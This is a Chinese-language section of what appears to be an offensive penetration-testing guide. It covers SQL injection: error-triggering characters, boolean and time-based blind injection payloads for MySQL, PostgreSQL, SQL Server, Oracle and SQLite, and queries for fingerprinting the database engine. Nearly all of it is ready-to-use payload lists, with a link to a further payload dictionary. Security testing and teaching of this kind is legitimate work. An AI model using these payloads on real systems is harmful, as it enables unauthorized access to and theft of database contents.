#  漏洞利用

## 3.1 WEB漏洞进阶

### SQL注入漏洞

#### 1.注入点检测

（1）报错信息

特殊字符：

```bash
'
%27
"
%22
#
%23
;
%3B
)
||
*
--
/* */
&apos;
```

SQL语句：

```bash
'SELECT  //不成对的引号
1' OR '1' = '2  //逻辑错误
'1' = 1 --  //类型错误
'1' AND ASCII('a') = '97 --  //函数错误
'1' OR ('x'='x'  //操作符错误
```
(2)Boolean盲注

盲注检测：

|描述|查询语句|
|----|----|
|逻辑运算|page.php?id=1 or 1=1 -- 返回为true<br>page.php?id=1' or 1=1 -- 返回为true<br>page.php?id=1" or 1=1 -- 返回为true<br>page.php?id=1 and 1=2 -- 返回为false|
|数学运算|page.php?id=1/1 -- 返回为true<br>page.php?id=1/0 -- 返回为false<br>page.php?id=1/abs(1) -- 返回为true<br>page.php?id=1/abf(1) -- 返回为false|

逻辑运算字典：

[sql_logic](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/sqli-logic.txt)

(3)时间盲注

MySQL：

```sql
1' + sleep(5)
1' and sleep(5)
1' && sleep(5)
1' | sleep(5)
```

PostgreSQL:

```sql
1' and pg_sleep(5)
1' || pg_sleep(5)
```

SQL Server:

```sql
1' WAITFOR DELAY '0:0:5'
1' AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT (SELECT SLEEP(5)) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=CHAR(109,97,115,116,101,114)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--
```

Oracle:

```sql
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',5)
1' AND DBMS_LOCK.SLEEP(5)
```

SQLite:

```sql
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```

#### 2.DBMS识别

MySQL识别：
|描述|查询语句|
|----|----|
|睡眠|id=1'-SLEEP(1)=0 LIMIT 1 --|
|BENCHMARK|id=1'-BENCHMARK(5000000, ENCODE('Slow Down','by 5 seconds'))=0 LIMIT 1 --|
|字符串拼接|id=' 'mysql' –<br>'my' 'sql'<br>CONCAT('my','sql')|
|函数|connection_id() --<br>row_count() --<br>POW(1,1) --|
|错误信息|id='|
|默认变量|@@version_compile_os<br>@@version<br>@@basedir<br>@@datadir|
|比较函数|conv('a',16,2)=conv('a',16,2)<br>connection_id()=connection_id()<br>crc32('MySQL')=crc32('MySQL')|

Oracle识别：
|描述|查询语句|
|----|----|
|字符串拼接|id='||'oracle' --|
|函数|BITAND(1,1) –|
|默认表|id='UNION SELECT 1 FROM v$version --|
|错误信息|id='|
|睡眠|dbms_pipe.receive_message(('a'),10)|
|默认变量|SELECT banner FROM v$version<br>SELECT version FROM v$instance|
|比较函数|ROWNUM=ROWNUM<br>RAWTOHEX('AB')=RAWTOHEX('AB')|
